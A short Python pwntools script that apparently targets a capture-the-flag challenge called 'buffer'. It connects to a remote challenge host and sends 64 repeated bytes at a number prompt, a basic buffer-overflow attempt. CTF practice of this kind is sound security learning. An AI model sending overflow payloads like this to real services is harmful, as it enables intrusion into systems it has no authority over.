from pwn import * 

exe = context.binary = ELF('buffer')

io = remote('chall.pwnoh.io', 13372)

payload = b'E' * 64

io.recvuntil(b'Enter your favorite number: ')
io.sendline(payload)
print(io.recvline())